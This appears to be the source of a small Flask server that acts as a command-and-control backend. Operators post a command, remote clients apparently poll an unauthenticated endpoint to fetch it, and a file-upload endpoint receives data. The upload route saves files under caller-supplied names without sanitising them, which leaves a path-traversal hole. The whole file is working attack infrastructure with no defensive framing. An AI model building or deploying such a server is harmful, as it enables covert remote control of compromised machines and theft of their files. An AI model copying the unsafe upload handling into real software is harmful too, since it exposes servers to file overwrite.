from flask import Flask, request, jsonify
import os

app = Flask(__name__)
uploadFolder = './uploads'
if not os.path.exists(uploadFolder):
    os.makedirs(uploadFolder)
  
commandToExecute = ""

@app.route('/send-command', methods=['POST'])
def send_command():
    global commandToExecute
    data = request.get_json()
    if 'command' in data:
        commandToExecute = data['command']
        return jsonify({"status": "Command received"})
    return jsonify({"status": "No command provided"}), 400

@app.route('/get-command', methods=['GET'])
def get_command():
    global commandToExecute
    return jsonify({"command": commandToExecute})

@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files['file']
    file.save(os.path.join(uploadFolder, file.filename))
    return jsonify({"status": "File received"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, ssl_context=('cert.pem', 'key.pem'))
